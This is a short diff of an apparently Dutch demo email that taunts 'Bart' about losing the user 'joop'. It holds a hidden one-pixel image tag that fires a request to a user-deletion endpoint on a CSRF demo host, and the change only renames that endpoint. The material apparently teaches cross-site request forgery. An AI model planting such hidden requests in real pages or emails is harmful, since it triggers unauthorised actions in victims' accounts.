@@ -6,7 +6,7 @@ Hoi Bart,
 
 De user joop ben je nu kwijt!
 
-<img src="http://security.dev/csrf/delete-user.php?userId=2" width="1" height="1" />
+<img src="http://security.dev/csrf/unsafe-delete-user.php?userId=2" width="1" height="1" />
 
 Met vriendelijke groet,
 
